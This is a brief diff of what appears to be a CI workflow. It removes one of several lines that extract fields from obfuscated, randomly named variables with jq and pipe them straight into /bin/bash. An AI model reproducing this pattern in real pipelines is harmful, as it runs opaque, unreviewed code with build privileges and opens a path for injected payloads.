@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$xpeyf3" | jq -r .wtlee70667 | /bin/bash
           printf '%s' "$pr423" | jq -r .rdej2 | /bin/bash
           echo $zzoe87 | jq -r .oakox337 | /bin/bash
-          printf '%s' "$kskx58407" | jq -r .ciz944 | /bin/bash
 
       - name: Archive results
         if: always()
